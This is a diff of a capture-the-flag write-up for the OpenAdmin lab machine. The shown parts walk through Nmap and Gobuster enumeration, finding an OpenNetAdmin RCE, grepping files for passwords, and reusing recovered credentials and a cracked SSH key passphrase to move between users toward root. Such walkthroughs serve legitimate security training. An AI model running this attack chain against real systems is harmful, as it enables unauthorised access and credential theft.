@@ -10,9 +10,9 @@ tags:
 ---
 OpenAdmin is an easy difficulty Linux machine that features an outdated OpenNetAdmin CMS instance. The CMS is exploited to gain a foothold, and subsequent enumeration reveals database credentials. These credentials are reused to move laterally to a low privileged user. This user is found to have access to a restricted internal application. Examination of this application reveals credentials that are used to move laterally to a second user. A sudo misconfiguration is then exploited to gain a root shell.
 
-## Nmap
+## Enumeration
 
-As usual, we first run nmap scan and get http on port 80 and ssh on port 22.
+I started with an Nmap scan:
 
 ```bash
 ❯ nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.136.167
@@ -34,7 +34,14 @@ PORT  STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-We scan the host with gobuster to enumerate hidden directories.
+The scan revealed two open ports:
+
+- 22/tcp: OpenSSH 7.6p1 Ubuntu
+- 80/tcp: Apache httpd 2.4.29 (Ubuntu)
+
+### Web Enumeration
+
+I navigated to the web server and saw a default Apache page. I decided to run Gobuster to find any hidden directories:
 
 ```bash
 ❯ gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.129.136.167/ -t 20
@@ -53,17 +60,19 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 Starting gobuster in directory enumeration mode
 ===============================================================
 /music                (Status: 301) [Size: 316] [--> http://10.129.136.167/music/]
+/ona                (Status: 301) [Size: 316] [--> http://10.129.136.167/ona/]
 ```
 
-And we got a hit, `/music`. Let's see what's in there.
+Gobuster found a directory `/music` and `/ona`. The `/ona` directory seemed interesting, so I opened it in the browser. It turned out to be OpenNetAdmin, a network administration tool.
 
 ![](../images/openadmin1.png)
 
-Nothing interesting at first, but when we try to login it redirects us to [OpenNetAdmin](https://opennetadmin.com/). 
+## Vulnerability Analysis
+### Exploiting OpenNetAdmin
 
 ![](../images/openadmin2.png)
 
-The version that is shown is old. Looking for public exploits, we find that it is vulnerable to Remote Code Execution.
+A quick Google search revealed that OpenNetAdmin 18.1.1 is vulnerable to Remote Code Execution (RCE) via the `ping` function.
 
 ```bash
 ❯ searchsploit OpenNetAdmin
@@ -145,6 +154,10 @@ www-data@openadmin:/opt/ona/www$ export TERM=xterm
 www-data@openadmin:/opt/ona/www$ export SHELL=bash
 ```
 
+## Privilege Escalation
+
+### www-data -> jimmy
+
 Looking for interesting files in the folder we are, we see that there are so much places to look.
 
 ```bash
@@ -165,6 +178,8 @@ winc
 ```
 
 So, instead of going one by one, I'll just try to get a password doing the following.
+
+### Reusing Credentials
 
 ```bash
 www-data@openadmin:/opt/ona/www$ grep -ri pass
@@ -195,6 +210,8 @@ www-data@openadmin:/opt/ona/www$ su jimmy
 Password: n1nj4W4rri0R!
 jimmy@openadmin:/opt/ona/www$ 
 ```
+
+### jimmy -> joanna
 
 Got it, doing some recon we find that port `52846` is running.
 
@@ -346,12 +363,16 @@ bloodninjas
 
 `bloodninjas` is the password for the `id_rsa`, we can now log in as `joanna` using it.
 
+### joanna -> root
+
 ```bash
 ❯ ssh joanna@10.129.136.167 -i id_rsa_encrypt
 Enter passphrase for key 'id_rsa_encrypt': bloodninjas
 joanna@openadmin:~$ cat user.txt 
 8343c1907e5be96627ebce7b19ceba64
 ```
+
+#### Sudo Privileges
 
 Looking for privileges, we can run `nano` as sudo.
 
